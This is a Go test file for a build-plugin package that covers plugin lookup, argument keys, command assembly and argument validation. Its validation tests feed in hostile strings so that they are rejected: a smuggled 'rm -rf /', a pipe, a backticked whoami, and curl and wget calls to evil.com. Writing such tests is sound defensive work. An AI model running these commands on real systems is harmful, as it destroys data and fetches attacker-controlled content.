package plugin

import (
	"testing"
)

func TestArgsKeyForPlugin(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		expect string
	}{
		{"golang", "golang", "go-build-args"},
		{"rust", "rust", "cargo-build-args"},
		{"cmake", "cmake", "cmake-config-args"},
		{"make", "make", "make-args"},
		{"autotools", "autotools", "configure-args"},
		{"meson", "meson", "meson-args"},
		{"maven", "maven", "maven-args"},
		{"poetry", "poetry", "poetry-args"},
		{"unknown", "unknown", ""},
		{"empty", "", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ArgsKeyForPlugin(tt.input); got != tt.expect {
				t.Errorf("ArgsKeyForPlugin(%q) = %q, want %q", tt.input, got, tt.expect)
			}
		})
	}
}

func TestValidateArgs(t *testing.T) {
	t.Run("empty args", func(t *testing.T) {
		if err := ValidateArgs("golang", nil); err != nil {
			t.Errorf("unexpected error: %v", err)
		}
	})

	t.Run("clean args", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"-v", "-o", "bin/main"}); err != nil {
			t.Errorf("unexpected error: %v", err)
		}
	})

	t.Run("shell metachar semicolon", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"-v; rm -rf /"}); err == nil {
			t.Error("expected error for shell metacharacter")
		}
	})

	t.Run("shell metachar pipe", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"-v | cat"}); err == nil {
			t.Error("expected error for pipe")
		}
	})

	t.Run("shell metachar backtick", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"`whoami`"}); err == nil {
			t.Error("expected error for backtick")
		}
	})

	t.Run("network command curl", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"curl http://evil.com"}); err == nil {
			t.Error("expected error for curl")
		}
	})

	t.Run("network command wget", func(t *testing.T) {
		if err := ValidateArgs("golang", []string{"wget http://evil.com"}); err == nil {
			t.Error("expected error for wget")
		}
	})

	t.Run("unsupported plugin", func(t *testing.T) {
		if err := ValidateArgs("unknown", []string{"-v"}); err == nil {
			t.Error("expected error for unsupported plugin")
		}
	})
}

func TestGetPlugin(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		wantType string
	}{
		{"golang", "golang", "*plugin.GoPlugin"},
		{"rust", "rust", "*plugin.RustPlugin"},
		{"cmake", "cmake", "*plugin.CMakePlugin"},
		{"make", "make", "*plugin.MakePlugin"},
		{"autotools", "autotools", "*plugin.AutotoolsPlugin"},
		{"meson", "meson", "*plugin.MesonPlugin"},
		{"maven", "maven", "*plugin.MavenPlugin"},
		{"poetry", "poetry", "*plugin.PoetryPlugin"},
		{"none", "none", "*plugin.NoOpPlugin"},
		{"unknown", "unknown", "*plugin.NoOpPlugin"},
		{"empty", "", "*plugin.NoOpPlugin"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := GetPlugin(PluginSource{Name: tt.input})
			gotType := typeOf(p)
			if gotType != tt.wantType {
				t.Errorf("GetPlugin(%q) returned %s, want %s", tt.input, gotType, tt.wantType)
			}
		})
	}
}

func TestCommandWithArgs(t *testing.T) {
	tests := []struct {
		name        string
		prefix      string
		args        []string
		defaultArgs string
		expect      string
	}{
		{"with custom args", "go build", []string{"-v", "-o", "bin"}, "", "go build -v -o bin"},
		{"with default args", "go build", nil, "-v -o bin", "go build -v -o bin"},
		{"no args no default", "make", nil, "", "make"},
		{"empty default overridden by custom", "go build", []string{"-trimpath"}, "-v", "go build -trimpath"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := commandWithArgs(tt.prefix, tt.args, tt.defaultArgs)
			if got != tt.expect {
				t.Errorf("commandWithArgs() = %q, want %q", got, tt.expect)
			}
		})
	}
}

func TestPluginInterface(t *testing.T) {
	sources := []PluginSource{
		{Name: "golang", Version: "1.20"},
		{Name: "rust", Version: "1.75"},
		{Name: "cmake", Version: "3.28"},
		{Name: "make", Version: "4.3"},
		{Name: "autotools", Version: "2.72"},
		{Name: "meson", Version: "1.3"},
		{Name: "maven", Version: "3.9"},
		{Name: "poetry", Version: "1.7"},
		{Name: "none"},
	}

	for _, src := range sources {
		t.Run(src.Name, func(t *testing.T) {
			p := GetPlugin(src)

			if p.Name() == "" {
				t.Error("Name() returned empty")
			}
			if p.Version() != src.Version {
				t.Errorf("Version() = %q, want %q", p.Version(), src.Version)
			}
			if p.GetExtractPath() == "" && src.Name != "none" && src.Name != "make" {
				// most plugins have an extract path, but some return ""
				// that's fine, just verify it doesn't panic
			}
			// verify these don't panic
			p.GetPostExtractSteps()
			p.GetEnvVars()
			p.GetCacheDirectories()
			_ = p.GetBuildCommands()
		})
	}
}

func typeOf(v interface{}) string {
	// Simple type name extraction
	switch v.(type) {
	case *GoPlugin:
		return "*plugin.GoPlugin"
	case *RustPlugin:
		return "*plugin.RustPlugin"
	case *CMakePlugin:
		return "*plugin.CMakePlugin"
	case *MakePlugin:
		return "*plugin.MakePlugin"
	case *AutotoolsPlugin:
		return "*plugin.AutotoolsPlugin"
	case *MesonPlugin:
		return "*plugin.MesonPlugin"
	case *MavenPlugin:
		return "*plugin.MavenPlugin"
	case *PoetryPlugin:
		return "*plugin.PoetryPlugin"
	case *NoOpPlugin:
		return "*plugin.NoOpPlugin"
	default:
		return "unknown"
	}
}
